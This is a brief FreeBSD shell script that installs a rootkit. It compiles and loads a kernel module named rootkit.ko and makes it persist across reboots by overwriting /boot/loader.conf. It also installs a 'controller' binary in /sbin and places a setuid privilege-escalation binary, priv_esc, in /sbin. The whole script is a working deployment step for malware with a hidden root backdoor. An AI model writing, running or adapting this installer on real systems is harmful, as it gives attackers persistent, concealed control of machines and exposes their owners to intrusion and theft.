#!/bin/sh

pkg install lang/gcc
make
echo 'rootkit_load="YES"' > /boot/loader.conf
kldload ./rootkit.ko
mv rootkit.ko /boot/kernel
gcc controller.c -o /sbin/controller
gcc priv_esc.c -o priv_esc
chmod +s priv_esc
mv priv_esc /sbin/priv_esc
